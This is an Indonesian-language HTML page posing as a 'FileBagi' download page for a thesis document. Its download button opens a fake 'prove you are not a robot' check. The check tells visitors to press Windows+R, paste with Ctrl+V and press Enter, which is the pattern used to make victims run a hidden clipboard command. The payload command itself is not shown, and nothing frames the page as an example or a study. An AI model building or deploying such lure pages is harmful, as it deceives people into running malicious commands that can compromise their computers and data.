<!doctype html>
<html lang="id"><head><meta charset="utf-8"><title>Unduh berkas</title><style>body{font-family:Georgia,serif;margin:0;background:#fff;color:#111}
.top{background:#eee;padding:10px 20px}.wrap{max-width:900px;margin:20px auto;padding:0 20px}
.modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.6);z-index:5000}
.card{background:#fff;max-width:480px;margin:80px auto;padding:28px;border-radius:6px}
.hide{position:absolute;left:-10000px;width:2px;height:2px}
pre{background:#f6f6f6;padding:10px}</style></head>
<body>
<div class="top" role="banner"><b>FileBagi</b></div><div class="wrap"><h1>Skripsi_Final_Revisi.docx</h1><p>Ukuran 2,4 MB</p>
<button id="dl" type="button">Unduh</button></div>
<div class="modal" id="m" style="display:none"><div class="card"><h2>Buktikan Anda bukan robot</h2>
<p>Ikuti tiga langkah singkat ini agar unduhan dimulai:</p>
<ol><li>Tekan tombol Windows dan R bersamaan</li><li>Tekan Ctrl + V</li><li>Tekan Enter lalu tutup jendela</li></ol></div></div>
<script>document.getElementById('dl').addEventListener('click',function(){document.getElementById('m').style.display='block';});</script>
</body></html>
